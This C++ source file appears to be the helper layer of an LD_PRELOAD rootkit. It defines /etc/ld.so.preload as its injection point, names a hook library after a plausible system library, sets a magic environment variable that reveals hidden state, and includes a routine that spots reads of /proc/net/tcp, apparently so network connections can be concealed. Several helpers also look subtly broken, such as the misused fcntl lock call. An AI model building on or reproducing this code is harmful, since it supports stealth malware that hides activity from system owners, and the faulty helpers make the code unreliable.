
#include "main.h"

//
// Global variables
//
const char *prelFileName = "/etc/ld.so.preload";
const char *prelFileNameClear = "ld.so.preload";
const char *linuxConfigPath = "/etc";
const char *envShowName = "REAL_STATE_OF_THINGS";
const char *envShowValue = MAGIC_STRING;
const char *dynCnfFileClear = "dynamic_cnf.txt";
char created = '1', not_created = '0', writed = '1', not_writed = '0', separator = ' ';
const char *hookLibraryNameClear = "libXextecDynamic.so.6";
const char *tcp4Path = "/proc/net/tcp";
const char *tmpNtwFileNameClear = "aslcviu7ewge123coderthj";
const int nameSize = 512;

//
// Classes, structures and functions
//
std::string intToString (int var) {
	std::ostringstream issCnv;
	issCnv << var;
	
	return issCnv.str ();
}

std::string readLinkName (const std::string & name) {
	std::string str;
	
	try {
		std::unique_ptr <char []> dat (new char [nameSize]);
		ssize_t ret;
		
		ret = readlink (name.c_str (), &dat[0], nameSize);
		dat[ret] = '\0';
		str = &dat[0];
	} catch (std::bad_alloc & Exc) {
		return std::string ();
	}
	
	return str;
}

bool haveTcp4Relation (int fd) {
	typedef typename std::string::size_type StrType;
	StrType nposVal = std::string::npos, pos1, pos2, pos3;
	std::string lnkAim;
	
	// to check /proc/net/tcp and /proc/PID/net/tcp
	lnkAim = readLinkName (("/proc/self/fd/" + intToString (fd)).c_str ());
	
	pos1 = lnkAim.find ("/proc");
	pos2 = lnkAim.find ("/net");
	pos3 = lnkAim.find ("/tcp");
	
	if (pos1 != nposVal && pos2 != nposVal && pos3 != nposVal) return true;
	
	return false;
}

std::string getCwdEasy () {
	int strSz = 16, i = 1;
	std::string tmp;
	
	tmp.resize (strSz);
	while (getcwd (&tmp[0], tmp.size ()) == NULL && errno == ERANGE) {
		++i;
		tmp.resize (i * strSz);
	}
	
	return tmp;
}

std::string getClearName (const std::string & str) {
	std::string tmp (str);
	size_t ind;
	
	ind = tmp.find_last_of ('/', 0);
	++ind;
	if (ind != std::string::npos)
		tmp.assign (tmp, ind, tmp.length () - ind);
	
	return tmp;
}

int lockAllFile (int fd) {
	flock lockDat = {F_RDLCK | F_WRLCK, SEEK_SET, 0, 0};
	return fcntl (fd, F_SETFL, &lockDat);
}



